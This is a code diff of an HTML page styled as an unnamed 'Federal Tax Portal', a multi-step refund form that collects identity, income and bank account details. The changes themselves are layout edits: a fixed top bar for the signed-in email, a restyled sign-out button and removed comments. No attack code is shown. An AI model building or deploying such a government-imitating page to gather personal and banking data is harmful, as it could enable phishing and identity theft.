@@ -14,19 +14,32 @@
         .error-border { border: 2px solid #dc3545 !important; }
         .success-text { color: #28a745; font-weight: bold; }
 
-        /* Session Display Styling */
-        #user-session-display {
-            display: none;
-            margin-bottom: 15px;
-            padding: 12px;
-            background: #e7f3ef;
-            border: 1px solid #b2d8cd;
-            border-radius: 8px;
-            color: #1e463a;
-            font-size: 0.9rem;
-            text-align: left;
-            animation: fadeIn 0.5s ease;
+        /* Session Display Styling at Top */
+        .top-email-bar {
+            background-color: #002868;
+            color: white;
+            padding: 10px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.85rem;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 2000;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            font-family: sans-serif;
         }
+
+        #user-session-display {
+            display: none; /* Controlled by tax.js */
+            background: rgba(255,255,255,0.1);
+            padding: 5px 12px;
+            border-radius: 4px;
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        
         .status-dot {
             display: inline-block;
             width: 8px;
@@ -69,50 +82,47 @@
             border-radius: 4px;
         }
 
-        /* Logout Button Fix */
-        #btn-logout {
-            display: none;
-            margin-left: 8px;
+        /* Adjust main container for fixed top bar */
+        body { padding-top: 60px; }
+
+        #btn-logout-top {
             background: #fff !important;
             color: #dc3545 !important;
             border: 1px solid #dc3545 !important;
-            font-weight: 600;
-            padding: 8px 15px;
+            padding: 4px 10px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 0.75rem;
+            margin-left: 10px;
+            font-weight: bold;
             text-decoration: none;
-            border-radius: 5px;
-            font-size: 0.85rem;
-            transition: all 0.2s;
         }
-        #btn-logout:hover {
-            background: #dc3545 !important;
-            color: #fff !important;
+        #btn-logout-top:hover { 
+            background: #dc3545 !important; 
+            color: #fff !important; 
         }
 
         @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
-
-        /* MOBILE PLACEHOLDER SIZE FIX */
-        @media (max-width: 480px) {
-            input::placeholder {
-                font-size: 1rem;
-            }
-        }
     </style>
 </head>
 <body>
 
+<div class="top-email-bar">
+    <div>🏛️ FEDERAL TAX PORTAL</div>
+    <div id="user-session-display">
+        <span class="status-dot"></span>
+        <span id="session-email-text"></span>
+        <button id="btn-logout-top" onclick="window.Auth.logout()">Sign Out</button>
+    </div>
+</div>
+
 <div class="form-container" role="main">
     <div id="auth-controls" style="text-align:center; margin-bottom:20px; padding:20px; background:#f1f3f5; border-radius:10px; border: 1px solid #dee2e6;">
         <p style="font-size:0.7rem; margin-bottom:12px; color:#6c757d; letter-spacing: 1px; font-weight: bold;">SECURE GOVERNMENT ACCESS PORTAL</p>
-        
-        <!-- Email display at the top -->
-        <div id="user-session-display">
-            <span class="status-dot"></span>
-            Authenticated: <strong id="session-email-text"></strong>
+        <div id="auth-buttons-initial">
+            <button id="btn-show-login" class="btn btn-secondary" style="display:inline-block; margin-right:8px;">Portal Login</button>
+            <button id="btn-show-register" class="btn btn-primary" style="display:inline-block;">Create Secure Account</button>
         </div>
-
-        <button id="btn-show-login" class="btn btn-secondary" style="display:inline-block; margin-right:8px;">Portal Login</button>
-        <button id="btn-show-register" class="btn btn-primary" style="display:inline-block;">Create Secure Account</button>
-        <a id="btn-logout" href="#" class="btn btn-secondary">Log Out</a>
     </div>
 
     <div id="auth-modal" class="modal" aria-hidden="true" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:9999; align-items:center; justify-content:center;">
@@ -219,7 +229,6 @@
     </div>
 
     <form id="refund-form" novalidate>
-        <!-- STEP 1: Tax Year & Filing -->
         <div class="step-content active" data-step="1">
             <div class="form-group official-seal-bg" style="padding:15px;">
                 <label for="tax-year">Select Tax Filing Period *</label>
@@ -247,7 +256,6 @@
             </div>
         </div>
 
-        <!-- STEP 2: Identity -->
         <div class="step-content" data-step="2" style="display:none;">
             <p class="security-note">Sensitive identity fields are masked for your protection. Ensure accuracy to avoid audit delays.</p>
             <div class="form-group">
@@ -278,7 +286,6 @@
             </div>
         </div>
 
-        <!-- STEP 3: Financials -->
         <div class="step-content" data-step="3" style="display:none;">
             <div class="form-group">
                 <label for="gross-income">Adjusted Gross Income (AGI) *</label>
@@ -307,7 +314,6 @@
             </div>
         </div>
 
-        <!-- STEP 4: Banking -->
         <div class="step-content" data-step="4" style="display:none;">
             <h3 style="color:#002868;">Electronic Funds Transfer (EFT)</h3>
             <div class="form-group">
@@ -325,7 +331,6 @@
             </div>
         </div>
 
-        <!-- STEP 5: Audit/Review -->
         <div class="step-content" data-step="5" style="display:none;">
             <h3 style="color:#002868;">Final Review of Application</h3>
             <div class="review-data" id="review-summary" style="padding:20px; background:#f0f7ff; border:1px solid #002868; border-radius:8px;">
@@ -349,7 +354,6 @@
         </div>
     </form>
 
-    <!-- Final Results Page -->
     <div id="final-results-page" style="display:none; text-align:center; padding:40px;">
         <div style="font-size: 80px; color: #28a745;">✓</div>
         <h2 style="color:#002868;">Submission Received</h2>
